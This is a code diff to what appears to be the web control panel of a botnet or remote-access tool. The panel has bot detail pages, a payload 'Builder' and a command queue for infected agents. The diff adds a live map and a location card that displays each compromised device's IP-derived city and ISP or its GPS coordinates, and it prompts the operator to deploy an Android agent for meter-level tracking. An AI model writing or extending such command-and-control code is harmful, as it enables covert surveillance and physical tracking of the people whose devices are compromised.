@@ -330,6 +330,7 @@ a{color:var(--accent);text-decoration:none}
     <button class="pnav active" id="pnav-overview" onclick="showPage('overview')">Overview</button>
     <button class="pnav" id="pnav-bot" onclick="showPage('bot')" style="display:none">Bot Detail</button>
     <button class="pnav" id="pnav-android" onclick="showPage('android')">Android</button>
+    <a class="pnav" href="map.html">🌍 Live Map</a>
     <button class="pnav" id="pnav-builder" onclick="showPage('builder')">&#9881; Builder</button>
     <button class="pnav" id="pnav-docs" onclick="showPage('docs')">&#128214; Docs</button>
   </nav>
@@ -834,6 +835,46 @@ async function renderTab(id, tab) {
 
 async function renderBot(id) { if(currentPage==='bot') await renderTab(id, currentTab); }
 
+// ── Location card (shared by Summary tab) ─────────────────────────────────────
+function renderLocationCard(bot) {
+  const loc = bot.lastLoc;
+  if (!loc) {
+    return `<div class="card" style="border-color:#1a2a1a">
+      <div class="card-title" style="color:#2dbe6c">📍 Location</div>
+      <p style="font-size:12px;color:var(--muted)">
+        No location data yet. Waiting for first check-in from a routable IP.<br>
+        <span style="font-size:11px">Windows: IP geolocation (city-level) · Android: GPS (meter-level via Live Map)</span>
+      </p>
+      <a href="map.html" class="btn btn-sec" style="font-size:11px;padding:5px 10px;align-self:flex-start">🌍 Open Live Map</a>
+    </div>`;
+  }
+  const isGps   = loc.source !== 'ip';
+  const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lon}`;
+  const osmUrl  = `https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lon}&zoom=12`;
+  const ago     = Math.round((Date.now()-new Date(loc.time).getTime())/1000);
+  const agoStr  = ago<60?ago+'s ago': ago<3600?Math.floor(ago/60)+'m ago': Math.floor(ago/3600)+'h ago';
+  return `<div class="card" style="border-color:#1a3a2a">
+    <div style="display:flex;align-items:center;justify-content:space-between;gap:8px">
+      <div class="card-title" style="color:#2dbe6c">📍 Location ${isGps?'<span style="font-size:9px;background:#0d2e1a;color:#2dbe6c;padding:1px 6px;border-radius:4px;font-weight:700">GPS</span>':'<span style="font-size:9px;background:#2e2a0d;color:#f4a261;padding:1px 6px;border-radius:4px;font-weight:700">IP-BASED</span>'}</div>
+      <a href="map.html" style="font-size:11px;color:var(--accent)">🌍 Live Map →</a>
+    </div>
+    <div class="info-grid">
+      ${loc.city ? `<div class="info-item"><label>City</label><p>${esc(loc.city)}, ${esc(loc.country)}</p></div>` : ''}
+      ${loc.isp  ? `<div class="info-item"><label>ISP / Org</label><p>${esc(loc.isp)}</p></div>` : ''}
+      <div class="info-item"><label>Coordinates</label><p>${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}</p></div>
+      ${loc.acc != null ? `<div class="info-item"><label>Accuracy</label><p>±${loc.acc}m</p></div>` : ''}
+      <div class="info-item"><label>Last Fix</label><p>${agoStr}</p></div>
+      <div class="info-item"><label>Source</label><p>${isGps ? 'GPS / Network' : 'IP Geolocation'}</p></div>
+    </div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      <a href="${mapsUrl}" target="_blank" class="btn btn-sec" style="font-size:11px;padding:5px 10px">📌 Google Maps</a>
+      <a href="${osmUrl}"  target="_blank" class="btn btn-sec" style="font-size:11px;padding:5px 10px">🗺 OpenStreetMap</a>
+      <a href="map.html" class="btn btn-sec" style="font-size:11px;padding:5px 10px">🌍 All Agents Map</a>
+    </div>
+    ${!isGps ? `<p style="font-size:10px;color:var(--muted)">⚠️ IP-based — city-level accuracy (~20km). Deploy Android agent for GPS-level tracking.</p>` : ''}
+  </div>`;
+}
+
 // ── Tab: Summary ──────────────────────────────────────────────────────────────
 
 function renderSummary(bot) {
@@ -857,6 +898,7 @@ function renderSummary(bot) {
       <div class="card-title">System Info</div>
       <div class="sysinfo">${esc(infoText)}</div>
     </div>
+    ${renderLocationCard(bot)}
     <div class="card">
       <div class="card-title">Send Command</div>
       ${bot.pendingCmd?'<p style="color:var(--warn);font-size:12px">&#9203; Queued: <code>'+esc(bot.pendingCmd)+'</code></p>':''}
